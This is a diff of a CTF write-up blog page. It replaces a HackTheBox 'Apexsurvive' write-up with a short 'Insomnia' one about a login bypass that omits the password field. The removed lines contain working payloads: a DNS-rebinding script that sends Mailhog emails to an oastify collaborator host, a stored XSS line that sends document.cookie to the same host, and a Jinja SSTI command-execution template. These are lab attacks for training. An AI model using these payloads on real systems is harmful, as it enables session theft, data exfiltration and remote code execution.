@@ -35,7 +35,7 @@
 
     <title>
         
-            HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup |
+            HackTheBox Insomnia |
             ShellUnease Writeups
         
     </title>
@@ -134,7 +134,7 @@
 
     <div class="header_middle">
         
-            HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup -
+            HackTheBox Insomnia -
             ShellUnease Writeups
         
     </div>
@@ -179,6 +179,14 @@
         
             
                 <li class="file">
+                    <a href="http://localhost:1313/posts/htb-insomnia/" title="./posts/htb-insomnia/">
+                        HackTheBox Insomnia
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
                     <a href="http://localhost:1313/posts/htb-ca-2024-apexsurvive/" title="./posts/htb-ca-2024-apexsurvive/">
                         HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
                     </a>
@@ -212,7 +220,7 @@
 
         <div class="title">
             <h1 class="title-header">
-                HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
+                HackTheBox Insomnia
             </h1>
 
             <div class="author-date-readtime">
@@ -235,8 +243,8 @@
                     <div class="date" title="Date">
                         <i class="bi bi-calendar3"></i>
                         <time
-                            datetime="2024.03.14"
-                            >2024.03.14
+                            datetime="2024.03.15"
+                            >2024.03.15
                         </time>
                     </div>
                 
@@ -246,7 +254,7 @@
                         class="readtime"
                         title="Time to Read">
                         <i class="bi bi-clock"></i>
-                        4 mins to read
+                        1 min to read
                     </div>
                 
             </div>
@@ -299,11 +307,11 @@
 
 
 
-<a href="http://localhost:1313/posts/htb-ca-2024-apexsurvive/" class="bread-btn">
+<a href="http://localhost:1313/posts/htb-insomnia/" class="bread-btn">
     
 
     
-        HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
+        HackTheBox Insomnia
     
 </a>
 
@@ -316,11 +324,7 @@
         
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#first-steps">First Steps</a></li>
-    <li><a href="#dns-rebinding-to-activate-an-internal-user">DNS Rebinding to Activate an Internal User</a></li>
-    <li><a href="#stored-xss-to-steal-the-session-cookie-from-the-admin">Stored XSS to Steal the Session Cookie From the Admin</a></li>
-    <li><a href="#leveraging-a-race-condition-for-ssti-leading-to-rce">Leveraging a Race Condition for SSTI Leading to RCE</a></li>
-    <li><a href="#references">References</a></li>
+    <li><a href="#bug-in-the-login-method">Bug in the login method</a></li>
   </ul>
 </nav>
         
@@ -328,109 +332,15 @@
 
         <div class="content">
             
-                <h2 id="first-steps">First Steps</h2>
-<p>We analyze the code and notice the email page will only show emails addressed to <em><a href="mailto:test@email.htb">test@email.htb</a></em>.</p>
-<p><img src="test-email.png" alt="EmailCode"></p>
-<p>We create a user with the email <em><a href="mailto:test@email.htb">test@email.htb</a></em> and confirm the registration by visiting the link from an email.</p>
-<p><img src="verify-email-1.png" alt="Verify email 1"></p>
-<p><img src="verify-email-2.png" alt="Verify email 2"></p>
-<h2 id="dns-rebinding-to-activate-an-internal-user">DNS Rebinding to Activate an Internal User</h2>
-<p>Upon further code inspection, we found out that users who sign up with an email hosted at <em>apexsurvive.htb</em> will be marked as internal users.</p>
-<p><img src="apexsurvive-email.png" alt="VerificationCode"></p>
-<p>There&rsquo;s an <em>/external</em> API endpoint that can be used for an open redirect.</p>
-<p><img src="open-redirect.png" alt="Open redirect"></p>
-<p>The emails are served by Mailhog running on port 9000 and can be internally retrieved by using the <em>/api/v2/messages</em> endpoint.</p>
-<p><img src="mailhog-port.png" alt="Mailhog port"></p>
-<p>We create a user <em><a href="mailto:asdf@apexsurvive.htb">asdf@apexsurvive.htb</a></em>.</p>
-<p><img src="apex-register.png" alt="Apex register"></p>
-<p>We log in and request a verification email. It won&rsquo;t appear in emails on the website.</p>
-<p><img src="apex-verify.png" alt="Apex verify"></p>
-<p>We&rsquo;ll use the <em>/external</em> endpoint for an open redirect to our controlled website and then do DNS rebinding to fetch emails from Mailhog running on port 9000 and get the confirmation email for the internal user. To do this, we&rsquo;ll set up an EC2 instance with a public IP address and then add a DNS NS record for it (keep in mind the dot at the end):</p>
-<p><img src="dns-config.png" alt="DNS config"></p>
-<p>We have to allow incoming traffic from ports UDP 53 (for DNS) and TCP 9000 (for the HTTP server) at minimum. We configure the security group of our EC2 instance as following.</p>
-<p><img src="security-group.png" alt="Security group configuration"></p>
-<p>On the instance, we&rsquo;ll run <a href="https://github.com/mogwailabs/DNSrebinder">https://github.com/mogwailabs/DNSrebinder</a> to change the resolution of my domain from EC2 public IP address to 127.0.0.1 after a moment:</p>
-<pre><code>sudo python3 dnsrebinder.py --domain dynamic.mywebsite.xyz. --rebind 127.0.0.1 --ip &lt;website-public-ip&gt; --counter 1 --udp --ttl 1
-</code></pre>
-<p>We&rsquo;ll also run an HTTP server on it serving index.html that keeps fetching /api/v2/messages for Mailhog emails and then sends them back to us. <strong>Remember it has to be on the same origin (port 9000).</strong></p>
-<pre><code>sudo python3 -m http.server 9000
-</code></pre>
-<p><em>index.html</em> served by the HTTP server:</p>
-<pre><code>&lt;html&gt;
-&lt;body&gt;
-&lt;script&gt;
-    (function () {
-        var axhr = new XMLHttpRequest();
-        axhr.open('GET', 'http://myburpcollab.oastify.com?start=start');
-        axhr.send()
-        var interval = setInterval(function () {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'http://dynamic.mywebsite.xyz:9000/api/v2/messages', false);
-            xhr.onload = function () {
-                if (xhr.status != 200) { return; }
-                var xhr2 = new XMLHttpRequest();
-                xhr2.open('GET', `http://myburpcollab.oastify.com?msgs=${btoa(this.responseText)}`);
-                xhr2.send();
-            };
-            xhr.send()
-        }, 200)
-    })();
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>The script keeps fetching <em><a href="http://dynamic.mywebsite.xyz:9000/api/v2/messages">http://dynamic.mywebsite.xyz:9000/api/v2/messages</a></em> in short intervals. which is on the same origin. After a while our DNS rebinder should switch from the EC2 IP address to localhost. Then, the script will successfully fetch the emails and send them back to us in base64.</p>
-<p>We log in as <em><a href="mailto:test@email.htb">test@email.htb</a></em> and report:</p>
-<pre><code>../external?url=http://dynamic.mywebsite.xyz:9000/
-</code></pre>
-<p>We notice how after a short moment our DNS server starts resolving our domain to 127.0.0.1 instead of our public IP.</p>
-<p><img src="dns-rebind.png" alt="DNS rebind"></p>
-<p>It might take about 1 minute before the domain resolution is updated to 127.0.0.1. The first callback after the one with query parameter <em>start=start</em> one contains base64 encoded emails from Mailhog API. We decode them and get the confirmation link for the internal user.</p>
-<p><img src="exfiltrated-emails.png" alt="Exfiltrated emails">
-<img src="base64-emails.png" alt="Base64 emails"></p>
-<h2 id="stored-xss-to-steal-the-session-cookie-from-the-admin">Stored XSS to Steal the Session Cookie From the Admin</h2>
-<p>As an internal user, we now can add products. In <em>/application/templates/product.html</em> we notice that the <em>product.note</em> (Product manual) from an input controlled by us is not sanitized and allows us to escape JS backticks.</p>
-<p><img src="product-note.png" alt="Product note JS string escape"></p>
-<p>We add any new product and in the product manual we put in:</p>
-<pre><code>`;fetch(&quot;https://myburpcollab.oastify.com/xss?c=&quot;+document.cookie);let x=`
-</code></pre>
-<p><img src="add-product.png" alt="Add product"></p>
-<p>We double-check we escaped JS backticks after adding the product:</p>
-<p><img src="js-backtick-escape.png" alt="JS backtick escape"></p>
-<p>After we create it, we make the admin visit it by reporting its assigned product number. We take the admin session cookie from the callback.</p>
-<p><img src="admin-session-xss.png" alt="Admin session XSS"></p>
-<h2 id="leveraging-a-race-condition-for-ssti-leading-to-rce">Leveraging a Race Condition for SSTI Leading to RCE</h2>
-<p>As an admin, we now can add PDF contracts. We notice that:</p>
-<ul>
-<li>the file is always saved to the same location before checking it’s a PDF,</li>
-<li>we can save the file anywhere by path traversal using “..” in the filename,</li>
-<li>the PDF check takes the temporary file from the file system, not directly from the request.</li>
-</ul>
-<p><img src="pdf-upload-race-condition.png" alt="Race condition in PDF upload"></p>
-<p>As a result, <strong>there’s a race condition between saving the temp file and checking that it’s a PDF.</strong></p>
-<p>We prepare 2 files:</p>
-<ol>
-<li>
-<p>a small PDF,</p>
-</li>
-<li>
-<p>a Jinja template that’ll read out the flag:</p>
-<pre><code> Result {{ self.__init__.__globals__.__builtins__.__import__('os').system('/readflag &gt; /app/application/static/images/flag.txt') }}
-</code></pre>
-</li>
-</ol>
-<p>We upload both and add them to a burp repeater group like so:</p>
-<p><img src="burp-parallel-1.png" alt="Burp parallel requests setup 1">
-<img src="burp-parallel-2.png" alt="Burp parallel requests setup 2"></p>
-<p>We try sending them multiple times using “Send group (parallel)”. We can play around with the number of PDF/Jinja template requests in the group. We watch out for <em>message: Contract added</em> in a response to a Jinja template upload. We check for it by refreshing any product page multiple times. If we see our payload, the flag is available under <em>/static/images/flag.txt</em>.</p>
-<p><img src="result-0.png" alt="Result 0">
-<img src="apex-flag.png" alt="Apex flag"></p>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://unit42.paloaltonetworks.com/dns-rebinding/">https://unit42.paloaltonetworks.com/dns-rebinding/</a></li>
-<li><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></li>
-<li><a href="https://portswigger.net/research/smashing-the-state-machine">https://portswigger.net/research/smashing-the-state-machine</a></li>
-</ul>
+                <h2 id="bug-in-the-login-method">Bug in the login method</h2>
+<p>We analyze the <em>login</em> method and find out that it is using the body of the POST request for the WHERE clause. It&rsquo;s checking that there are 2 keys in the body, however it doesn&rsquo;t explicitly check that the password is provided.</p>
+<p><img src="code.png" alt="Code"></p>
+<p>We check <em>entrypoint.sh</em> and learn that the <em>users</em> table consists of 3 columns: <em>id</em>, <em>username</em> and *password.</p>
+<p><img src="table.png" alt="Table"></p>
+<p>We craft a login request with just <em>username</em> and <em>id</em> parameters, omitting <em>password</em>.</p>
+<p><img src="request.png" alt="Request"></p>
+<p>We copy the session and head over to <em>/index.php/profile</em> for the flag.</p>
+<p><img src="admin.png" alt="Admin profile"></p>
 
             
         </div>
@@ -479,7 +389,7 @@
                 <li>
                     
                         Word Count:
-                        754
+                        89
                     
                 </li>
             
@@ -515,7 +425,7 @@
                     
                         Last modified: &nbsp;
                         <time>
-                            Mar 14 2024 17:38:37
+                            Mar 15 2024 23:10:53
                         </time>
                     
                 </li>
